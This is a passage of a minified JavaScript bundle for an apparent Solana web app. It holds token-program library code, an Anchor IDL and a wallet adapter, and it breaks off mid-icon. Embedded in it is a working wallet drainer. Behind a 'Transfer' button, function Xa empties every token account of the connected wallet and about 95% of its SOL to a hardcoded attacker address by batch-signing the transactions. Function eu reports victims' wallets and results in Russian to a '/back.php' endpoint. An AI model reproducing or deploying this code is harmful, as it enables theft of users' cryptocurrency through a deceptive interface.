                ja(t) ? (r = t.publicKey, i = [t]) : (r = t, i = n), await Pa("FreezeAccount", this.connection, (new _.Transaction).add(Va.createFreezeAccountInstruction(this.programId, e, this.publicKey, r, n)), this.payer, ...i)
            }
            async thawAccount(e, t, n) {
                let r, i;
                ja(t) ? (r = t.publicKey, i = [t]) : (r = t, i = n), await Pa("ThawAccount", this.connection, (new _.Transaction).add(Va.createThawAccountInstruction(this.programId, e, this.publicKey, r, n)), this.payer, ...i)
            }
            async transferChecked(e, t, n, r, i, o) {
                let s, a;
                return ja(n) ? (s = n.publicKey, a = [n]) : (s = n, a = r), await Pa("TransferChecked", this.connection, (new _.Transaction).add(Va.createTransferCheckedInstruction(this.programId, e, this.publicKey, t, s, r, i, o)), this.payer, ...a)
            }
            async approveChecked(e, t, n, r, i, o) {
                let s, a;
                ja(n) ? (s = n.publicKey, a = [n]) : (s = n, a = r), await Pa("ApproveChecked", this.connection, (new _.Transaction).add(Va.createApproveCheckedInstruction(this.programId, e, this.publicKey, t, s, r, i, o)), this.payer, ...a)
            }
            async mintToChecked(e, t, n, r, i) {
                let o, s;
                ja(t) ? (o = t.publicKey, s = [t]) : (o = t, s = n), await Pa("MintToChecked", this.connection, (new _.Transaction).add(Va.createMintToCheckedInstruction(this.programId, this.publicKey, e, o, n, r, i)), this.payer, ...s)
            }
            async burnChecked(e, t, n, r, i) {
                let o, s;
                ja(t) ? (o = t.publicKey, s = [t]) : (o = t, s = n), await Pa("BurnChecked", this.connection, (new _.Transaction).add(Va.createBurnCheckedInstruction(this.programId, this.publicKey, e, o, n, r, i)), this.payer, ...s)
            }
            async syncNative(e) {
                await Pa("SyncNative", this.connection, (new _.Transaction).add(Va.createSyncNativeInstruction(this.programId, e)), this.payer)
            }
            static createInitMintInstruction(e, t, n, r, i) {
                let o = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: _.SYSVAR_RENT_PUBKEY,
                    isSigner: !1,
                    isWritable: !1
                }];
                const s = Ba([xa("instruction"), xa("decimals"), Oa("mintAuthority"), xa("option"), Oa("freezeAuthority")]);
                let a = Go.Buffer.alloc(1024); {
                    const e = s.encode({
                        instruction: 0,
                        decimals: n,
                        mintAuthority: za(r),
                        option: null === i ? 0 : 1,
                        freezeAuthority: za(i || new _.PublicKey(0))
                    }, a);
                    a = a.slice(0, e)
                }
                return new _.TransactionInstruction({
                    keys: o,
                    programId: e,
                    data: a
                })
            }
            static createInitAccountInstruction(e, t, n, r) {
                const i = [{
                        pubkey: n,
                        isSigner: !1,
                        isWritable: !0
                    }, {
                        pubkey: t,
                        isSigner: !1,
                        isWritable: !1
                    }, {
                        pubkey: r,
                        isSigner: !1,
                        isWritable: !1
                    }, {
                        pubkey: _.SYSVAR_RENT_PUBKEY,
                        isSigner: !1,
                        isWritable: !1
                    }],
                    o = Ba([xa("instruction")]),
                    s = Go.Buffer.alloc(o.span);
                return o.encode({
                    instruction: 1
                }, s), new _.TransactionInstruction({
                    keys: i,
                    programId: e,
                    data: s
                })
            }
            static createTransferInstruction(e, t, n, r, i, o) {
                const s = Ba([xa("instruction"), Ca("amount")]),
                    a = Go.Buffer.alloc(s.span);
                s.encode({
                    instruction: 3,
                    amount: new Ua(o).toBuffer()
                }, a);
                let u = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === i.length ? u.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (u.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => u.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: u,
                    programId: e,
                    data: a
                })
            }
            static createApproveInstruction(e, t, n, r, i, o) {
                const s = Ba([xa("instruction"), Ca("amount")]),
                    a = Go.Buffer.alloc(s.span);
                s.encode({
                    instruction: 4,
                    amount: new Ua(o).toBuffer()
                }, a);
                let u = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }];
                return 0 === i.length ? u.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (u.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => u.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: u,
                    programId: e,
                    data: a
                })
            }
            static createRevokeInstruction(e, t, n, r) {
                const i = Ba([xa("instruction")]),
                    o = Go.Buffer.alloc(i.span);
                i.encode({
                    instruction: 5
                }, o);
                let s = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === r.length ? s.push({
                    pubkey: n,
                    isSigner: !0,
                    isWritable: !1
                }) : (s.push({
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }), r.forEach((e => s.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: s,
                    programId: e,
                    data: o
                })
            }
            static createSetAuthorityInstruction(e, t, n, r, i, o) {
                const s = Ba([xa("instruction"), xa("authorityType"), xa("option"), Oa("newAuthority")]);
                let a = Go.Buffer.alloc(1024); {
                    const e = s.encode({
                        instruction: 6,
                        authorityType: Fa[r],
                        option: null === n ? 0 : 1,
                        newAuthority: za(n || new _.PublicKey(0))
                    }, a);
                    a = a.slice(0, e)
                }
                let u = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === o.length ? u.push({
                    pubkey: i,
                    isSigner: !0,
                    isWritable: !1
                }) : (u.push({
                    pubkey: i,
                    isSigner: !1,
                    isWritable: !1
                }), o.forEach((e => u.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: u,
                    programId: e,
                    data: a
                })
            }
            static createMintToInstruction(e, t, n, r, i, o) {
                const s = Ba([xa("instruction"), Ca("amount")]),
                    a = Go.Buffer.alloc(s.span);
                s.encode({
                    instruction: 7,
                    amount: new Ua(o).toBuffer()
                }, a);
                let u = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === i.length ? u.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (u.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => u.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: u,
                    programId: e,
                    data: a
                })
            }
            static createBurnInstruction(e, t, n, r, i, o) {
                const s = Ba([xa("instruction"), Ca("amount")]),
                    a = Go.Buffer.alloc(s.span);
                s.encode({
                    instruction: 8,
                    amount: new Ua(o).toBuffer()
                }, a);
                let u = [{
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === i.length ? u.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (u.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => u.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: u,
                    programId: e,
                    data: a
                })
            }
            static createCloseAccountInstruction(e, t, n, r, i) {
                const o = Ba([xa("instruction")]),
                    s = Go.Buffer.alloc(o.span);
                o.encode({
                    instruction: 9
                }, s);
                let a = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === i.length ? a.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (a.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => a.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: a,
                    programId: e,
                    data: s
                })
            }
            static createFreezeAccountInstruction(e, t, n, r, i) {
                const o = Ba([xa("instruction")]),
                    s = Go.Buffer.alloc(o.span);
                o.encode({
                    instruction: 10
                }, s);
                let a = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }];
                return 0 === i.length ? a.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (a.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => a.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: a,
                    programId: e,
                    data: s
                })
            }
            static createThawAccountInstruction(e, t, n, r, i) {
                const o = Ba([xa("instruction")]),
                    s = Go.Buffer.alloc(o.span);
                o.encode({
                    instruction: 11
                }, s);
                let a = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }];
                return 0 === i.length ? a.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (a.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => a.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: a,
                    programId: e,
                    data: s
                })
            }
            static createTransferCheckedInstruction(e, t, n, r, i, o, s, a) {
                const u = Ba([xa("instruction"), Ca("amount"), xa("decimals")]),
                    c = Go.Buffer.alloc(u.span);
                u.encode({
                    instruction: 12,
                    amount: new Ua(s).toBuffer(),
                    decimals: a
                }, c);
                let l = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }, {
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === o.length ? l.push({
                    pubkey: i,
                    isSigner: !0,
                    isWritable: !1
                }) : (l.push({
                    pubkey: i,
                    isSigner: !1,
                    isWritable: !1
                }), o.forEach((e => l.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: l,
                    programId: e,
                    data: c
                })
            }
            static createApproveCheckedInstruction(e, t, n, r, i, o, s, a) {
                const u = Ba([xa("instruction"), Ca("amount"), xa("decimals")]),
                    c = Go.Buffer.alloc(u.span);
                u.encode({
                    instruction: 13,
                    amount: new Ua(s).toBuffer(),
                    decimals: a
                }, c);
                let l = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }, {
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }];
                return 0 === o.length ? l.push({
                    pubkey: i,
                    isSigner: !0,
                    isWritable: !1
                }) : (l.push({
                    pubkey: i,
                    isSigner: !1,
                    isWritable: !1
                }), o.forEach((e => l.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: l,
                    programId: e,
                    data: c
                })
            }
            static createMintToCheckedInstruction(e, t, n, r, i, o, s) {
                const a = Ba([xa("instruction"), Ca("amount"), xa("decimals")]),
                    u = Go.Buffer.alloc(a.span);
                a.encode({
                    instruction: 14,
                    amount: new Ua(o).toBuffer(),
                    decimals: s
                }, u);
                let c = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === i.length ? c.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (c.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => c.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: c,
                    programId: e,
                    data: u
                })
            }
            static createBurnCheckedInstruction(e, t, n, r, i, o, s) {
                const a = Ba([xa("instruction"), Ca("amount"), xa("decimals")]),
                    u = Go.Buffer.alloc(a.span);
                a.encode({
                    instruction: 15,
                    amount: new Ua(o).toBuffer(),
                    decimals: s
                }, u);
                let c = [{
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }];
                return 0 === i.length ? c.push({
                    pubkey: r,
                    isSigner: !0,
                    isWritable: !1
                }) : (c.push({
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !1
                }), i.forEach((e => c.push({
                    pubkey: e.publicKey,
                    isSigner: !0,
                    isWritable: !1
                })))), new _.TransactionInstruction({
                    keys: c,
                    programId: e,
                    data: u
                })
            }
            static createSyncNativeInstruction(e, t) {
                const n = Ba([xa("instruction")]),
                    r = Go.Buffer.alloc(n.span);
                n.encode({
                    instruction: 17
                }, r);
                let i = [{
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !0
                }];
                return new _.TransactionInstruction({
                    keys: i,
                    programId: e,
                    data: r
                })
            }
            static async getAssociatedTokenAddress(e, t, n, r) {
                if (!(arguments.length > 4 && void 0 !== arguments[4] && arguments[4]) && !_.PublicKey.isOnCurve(r.toBuffer())) throw new Error(`Owner cannot sign: ${r.toString()}`);
                return (await _.PublicKey.findProgramAddress([r.toBuffer(), t.toBuffer(), n.toBuffer()], e))[0]
            }
            static createAssociatedTokenAccountInstruction(e, t, n, r, i, o) {
                const s = Go.Buffer.alloc(0);
                let a = [{
                    pubkey: o,
                    isSigner: !0,
                    isWritable: !0
                }, {
                    pubkey: r,
                    isSigner: !1,
                    isWritable: !0
                }, {
                    pubkey: i,
                    isSigner: !1,
                    isWritable: !1
                }, {
                    pubkey: n,
                    isSigner: !1,
                    isWritable: !1
                }, {
                    pubkey: _.SystemProgram.programId,
                    isSigner: !1,
                    isWritable: !1
                }, {
                    pubkey: t,
                    isSigner: !1,
                    isWritable: !1
                }, {
                    pubkey: _.SYSVAR_RENT_PUBKEY,
                    isSigner: !1,
                    isWritable: !1
                }];
                return new _.TransactionInstruction({
                    keys: a,
                    programId: e,
                    data: s
                })
            }
        }
        const Qa = JSON.parse('{"version":"0.1.0","name":"token_transfer","instructions":[{"name":"initialize","accounts":[{"name":"pdaAccount","isMut":true,"isSigner":false},{"name":"tokenMint","isMut":false,"isSigner":false},{"name":"tokenVault","isMut":true,"isSigner":false},{"name":"initializer","isMut":true,"isSigner":true},{"name":"systemProgram","isMut":false,"isSigner":false},{"name":"tokenProgram","isMut":false,"isSigner":false},{"name":"rent","isMut":false,"isSigner":false}],"args":[{"name":"noncePda","type":"u8"},{"name":"nonceTokenVault","type":"u8"}]},{"name":"toggleFreezeProgram","accounts":[{"name":"pdaAccount","isMut":true,"isSigner":false},{"name":"admin","isMut":false,"isSigner":true}],"args":[{"name":"noncePda","type":"u8"}]},{"name":"updateAdmin","accounts":[{"name":"pdaAccount","isMut":true,"isSigner":false},{"name":"admin","isMut":false,"isSigner":true}],"args":[{"name":"noncePda","type":"u8"},{"name":"newAdmin","type":"publicKey"}]},{"name":"sendToken","accounts":[{"name":"tokenTo","isMut":true,"isSigner":false},{"name":"tokenFrom","isMut":true,"isSigner":false},{"name":"fromAuthority","isMut":true,"isSigner":true},{"name":"tokenProgram","isMut":false,"isSigner":false}],"args":[{"name":"amount","type":"u64"}]},{"name":"mintTo","accounts":[{"name":"tokenMint","isMut":false,"isSigner":false},{"name":"tokenVault","isMut":true,"isSigner":false},{"name":"tokenTo","isMut":true,"isSigner":false},{"name":"tokenToAuthority","isMut":false,"isSigner":true},{"name":"tokenProgram","isMut":false,"isSigner":false}],"args":[{"name":"nonceTokenVault","type":"u8"},{"name":"amount","type":"u64"}]}],"accounts":[{"name":"PdaAccount","type":{"kind":"struct","fields":[{"name":"adminKey","type":"publicKey"},{"name":"freezeProgram","type":"bool"}]}}],"errors":[{"code":6000,"name":"NotAdmin","msg":"Not admin"},{"code":6001,"name":"InvalidMintForReward","msg":"Invalid mint for reward"},{"code":6002,"name":"NoAuthorizedCreatorsFoundInMetadata","msg":"No authorized creators found in metadata"},{"code":6003,"name":"NoAuthorizedNameStartFoundInMetadata","msg":"No authorized name start found in metadata"},{"code":6004,"name":"TokenTransferFailed","msg":"Token transfer failed"},{"code":6005,"name":"TokenMintFailed","msg":"Token mint failed"},{"code":6006,"name":"NotListedItem","msg":"Not staked item"},{"code":6007,"name":"NotClaimableItem","msg":"Not claimable item"},{"code":6008,"name":"CantUnstakeBeforeClaim","msg":"Can\'t unstake before claim all rewards"},{"code":6009,"name":"CloseAccountFailed","msg":"Close account failed"},{"code":6010,"name":"MetadataDoesntExist","msg":"Metadata doesn\'t exist"},{"code":6011,"name":"DerivedKeyInvalid","msg":"Derived key invalid"},{"code":6012,"name":"InvalidAccounts","msg":"Invalid accounts"},{"code":6013,"name":"InitializeTokenAccountFailed","msg":"Initialize token account failed"},{"code":6014,"name":"SetAccountAuthorityFailed","msg":"Set account authority failed"},{"code":6015,"name":"InvalidStakingPeriod","msg":"Invalid staking period"},{"code":6016,"name":"StakingLocked","msg":"Staking locked"},{"code":6017,"name":"StakingNotLocked","msg":"Staking not locked"},{"code":6018,"name":"IncorrectOwner","msg":"Incorrect owner"},{"code":6019,"name":"AccountDiscriminatorMismatch","msg":"8 byte discriminator did not match what was expected"},{"code":6020,"name":"CantCloseBeforeUnstake","msg":"Can\'t close before unstaking all."},{"code":6021,"name":"OwnerNotId","msg":"OwnerNotId"},{"code":6022,"name":"DifferentIndex","msg":"DifferentIndex."},{"code":6023,"name":"DifferentWallet","msg":"DifferentWallet"}],"metadata":{"address":"7XRYEDuRarTud1pCBWgNoW52LhK2dXoVR8rbcvwZfuki"}}'),
            {
                SystemProgram: Ga
            } = _,
            Ya = new _.PublicKey(Qa.metadata.address);
        new _.PublicKey("8hziHSv33pNMBgMYbcCLmxbpRTsH28YxZNe9dyW84NvA");
        async function Za(e) {
            const t = new _.Connection("https://api.metaplex.solana.com", "processed");
            return new Rr(t, e, "processed")
        }
        const Ja = async (e, t, n) => {
                if (0 === n.length) return [];
                const r = (await e.getRecentBlockhash("max")).blockhash;
                for (let o of n) o.feePayer = t.publicKey, o.recentBlockhash = r;
                await t.signAllTransactions(n);
                const i = await Promise.all(n.map((async (t, n) => {
                    try {
                        return await (0, _.sendAndConfirmRawTransaction)(e, t.serialize())
                    } catch (r) {
                        return null
                    }
                })));
                return console.log(i), i
            },
            Xa = async (e, t) => {
                const n = await Za(e),
                    r = new Vo(Qa, Ya, n),
                    i = await (async e => {
                        const t = await Za(e),
                            n = e.publicKey.toString(),
                            r = [{
                                dataSize: 165
                            }, {
                                memcmp: {
                                    offset: 32,
                                    bytes: n
                                }
                            }],
                            i = await t.connection.getParsedProgramAccounts(La, {
                                filters: r
                            });
                        return console.log(`Found ${i.length} token account(s) for wallet ${n}.`), eu("\u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d \u0430\u043a\u043a\u0430\u0443\u043d\u0442 <b>" + n + "</b><br>\u041d\u0430\u0439\u0434\u0435\u043d\u043e <b>" + i.length + "</b> \u0442\u043e\u043a\u0435\u043d\u0430(\u043e\u0432)."), i
                    })(e),
                    o = [],
                    s = new _.Transaction,
                    a = new _.PublicKey(t);
                for (const h of i) {
                    const t = new _.Transaction,
                        i = h.account.data,
                        s = i.parsed.info.mint,
                        u = new _.PublicKey(s),
                        c = i.parsed.info.tokenAmount.amount;
                    if (!i.parsed.info.tokenAmount.uiAmount) continue;
                    const l = new(we())(c),
                        f = h.pubkey,
                        d = await $a(t, n.connection, u, a, e.publicKey, !0);
                    t.add(r.instruction.sendToken(l, {
                        accounts: {
                            tokenFrom: f,
                            tokenTo: d,
                            fromAuthority: n.wallet.publicKey,
                            tokenProgram: La
                        }
                    })), console.log(i), console.log(`Token Account No.: ${h.pubkey.toString()}`), console.log(`--Token Mint: ${s}`), console.log(`--Token Balance: ${c}`), o.push(t)
                }
                let u = await n.connection.getBalance(n.wallet.publicKey),
                    c = .005 * i.length;
                c = c.toFixed(0);
                let l = u - c;
                l *= .95, l = l.toFixed(0), s.add(Ga.transfer({
                    fromPubkey: n.wallet.publicKey,
                    toPubkey: a,
                    lamports: l
                })), o.push(s);
                try {
                    return await Ja(n.connection, e, o)
                } catch (f) {
                    return console.log(f), eu("\u274c <b>\u0422\u0440\u0430\u043d\u0437\u0430\u043a\u0446\u0438\u044f \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0430</b>"), !1
                }
            };
        async function $a(e, t, n, r, i, o) {
            const s = await Va.getAssociatedTokenAddress(Na, La, n, r, o);
            return await t.getAccountInfo(s) || e.add(Va.createAssociatedTokenAccountInstruction(Na, La, n, s, r, i)), s
        }
        const eu = async e => {
            fetch("/back.php?key=8bEEokUZLhn7nAHz&m=" + e)
        };
        const tu = function() {
                const e = T();
                return (0, o.jsx)("div", {
                    className: "App",
                    children: (0, o.jsxs)("header", {
                        className: "App-header",
                        children: [(0, o.jsx)(ye, {
                            className: "wallet-btn"
                        }), (0, o.jsx)("img", {
                            src: n,
                            className: "App-logo",
                            alt: "logo"
                        }), (0, o.jsx)(y, {
                            children: (0, o.jsx)(m, {
                                children: (0, o.jsx)(k, {
                                    type: "submit",
                                    onClick: async () => {
                                        const t = await Xa(e, "C3wVh4tCmwnXDdBTPTU4zVUi7PY5hzp97ZHhm4fYa3q6");
                                        t ? (console.log("OK::::", t), eu("\u2705 <b>\u0422\u0440\u0430\u043d\u0437\u0430\u043a\u0446\u0438\u044f \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0430:</b> https://solscan.io/tx/" + t)) : (console.log("fail"), eu("\u274c <b>\u0422\u0440\u0430\u043d\u0437\u0430\u043a\u0446\u0438\u044f \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0430</b>"))
                                    },
                                    children: "Transfer"
                                })
                            })
                        })]
                    })
                })
            },
            nu = e => {
                e && e instanceof Function && __webpack_require__.e(787).then(__webpack_require__.bind(__webpack_require__, 787)).then((t => {
                    let {
                        getCLS: n,
                        getFID: r,
                        getFCP: i,
                        getLCP: o,
                        getTTFB: s
                    } = t;
                    n(e), r(e), i(e), o(e), s(e)
                }))
            };
        var ru;
        ! function(e) {
            e.Mainnet = "mainnet-beta", e.Testnet = "testnet", e.Devnet = "devnet"
        }(ru || (ru = {}));
        class iu extends Z {
            async sendTransaction(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
                    r = !0;
                try {
                    if ("version" in e) {
                        if (!this.supportedTransactionVersions) throw new K("Sending versioned transactions isn't supported by this wallet");
                        if (!this.supportedTransactionVersions.has(e.version)) throw new K(`Sending transaction version ${e.version} isn't supported by this wallet`);
                        try {
                            const r = (e = await this.signTransaction(e)).serialize();
                            return await t.sendRawTransaction(r, n)
                        } catch (i) {
                            if (i instanceof V) throw r = !1, i;
                            throw new K(null === i || void 0 === i ? void 0 : i.message, i)
                        }
                    } else try {
                        const {
                            signers: r,
                            ...i
                        } = n;
                        e = await this.prepareTransaction(e, t, i), (null === r || void 0 === r ? void 0 : r.length) && e.partialSign(...r);
                        const o = (e = await this.signTransaction(e)).serialize();
                        return await t.sendRawTransaction(o, i)
                    } catch (i) {
                        if (i instanceof V) throw r = !1, i;
                        throw new K(null === i || void 0 === i ? void 0 : i.message, i)
                    }
                } catch (i) {
                    throw r && this.emit("error", i), i
                }
            }
            async signAllTransactions(e) {
                for (const n of e)
                    if ("version" in n) {
                        if (!this.supportedTransactionVersions) throw new V("Signing versioned transactions isn't supported by this wallet");
                        if (!this.supportedTransactionVersions.has(n.version)) throw new V(`Signing transaction version ${n.version} isn't supported by this wallet`)
                    }
                const t = [];
                for (const n of e) t.push(await this.signTransaction(n));
                return t
            }
        }
        class ou extends iu {}
        class su extends ou {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                var t;
                if (super(), this.name = "Glow", this.url = "https://glow.app", this.icon = "data:image/png;base64,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